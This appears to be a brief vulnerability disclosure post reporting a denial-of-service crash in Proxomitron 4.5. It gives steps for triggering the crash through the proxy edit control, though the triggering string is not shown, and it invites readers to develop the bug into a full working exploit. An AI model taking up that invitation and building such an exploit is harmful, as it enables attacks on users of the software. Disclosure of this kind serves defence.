Proxomitron 4.5 Denial of Service attack
========================================

I have managed to find a dos exploit in proxomitron 4.5. I have tried to exploit this further into a full working exploit but not had success as of yet. Will be happy for others to see if they can try and take this further and post feed back to me. To test this open up proxomiton, click the proxy button add the string into the edit control and click test or ok. seems to have different effects if you click the add button and add a longer string to the enter new proxy server dalog.

kind regards
